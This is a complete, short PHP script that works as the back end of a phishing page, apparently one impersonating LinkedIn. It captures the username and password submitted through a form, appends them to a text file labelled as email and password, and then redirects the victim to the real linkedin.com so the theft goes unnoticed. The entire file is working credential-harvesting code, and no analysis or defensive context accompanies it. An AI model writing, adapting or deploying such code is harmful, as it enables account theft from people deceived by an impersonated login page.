<?php
$var = $_POST['UsernameForm'];
$var2 = $_POST['PasswordForm'];
$myFile = file_get_contents("protect.html");

if($myFile) {
    file_put_contents("cat.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "\n", FILE_APPEND);
    header('Location: https://linkedin.com/');
}

exit();
?>

